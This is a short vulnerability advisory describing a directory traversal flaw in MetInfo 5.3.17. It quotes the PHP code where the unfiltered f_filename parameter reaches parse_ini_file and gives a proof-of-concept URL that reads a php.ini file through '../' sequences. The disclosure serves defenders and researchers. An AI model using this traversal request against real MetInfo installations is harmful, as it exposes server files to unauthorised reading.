# MetInfo 5.3.17 directory traversal vulnerability #


## 1.Technical Description: ##

locate in /admin/app/physical/physical.php 

	elseif($action=="fingerprintdo"){
    	if(file_exists($f_filename)){fingerprint('../../..',$f_filename);}
     	else{$physical_fingerprint="-1";}
     	require_once $depth.'../include/config.php';
       	header("location:advanced.php?lang={$lang}&anyid={$anyid}&cs=3&phy=1");exit;

Then we can control the variable $f_filename in the function fingerprint() 


locate in function fingerprint()

	function fingerprint($jkdir,$fileback){
    	global $filenamearray,$physical_fingerprint,$url_array;
    	$adminfile=$url_array[count($url_array)-2];
    	deltree(ROOTPATH.'/cache');
    	deltree(ROOTPATH."/$adminfile/update");
   		$physical_fingerprint="";
    	$fbdir=$fileback;
    	$fileback=parse_ini_file($fileback,true);

The $fileback didn't be filtered.So we can use $fileback to read other file.

## 2.PoC ##

we use

> http://127.0.0.1/admin/app/physical/physical.php?action=fingerprintdo&f_filename=../../../../../bin/php/php5.6.25/php.ini


![](https://github.com/phantom0301/vulns/blob/master/333.jpg)

